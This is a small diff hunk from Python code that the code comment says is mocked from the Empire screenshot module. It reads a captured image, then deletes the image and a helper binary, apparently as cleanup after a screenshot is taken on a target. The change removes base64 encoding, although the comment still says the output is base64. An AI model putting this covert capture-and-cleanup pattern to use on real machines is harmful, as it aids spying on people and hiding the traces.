@@ -82,7 +82,7 @@ time.sleep(4)
 # base64 up resulting file, delete the file and binary, return the base64 of the png output
 #   mocked from the Empire screenshot module
 f = open('%sdebug.jpg', 'rb')
-data = base64.b64encode(f.read())
+data = f.read()
 f.close()
 run_command('rm -f %sdebug')
 run_command('rm -f %sdebug.jpg')
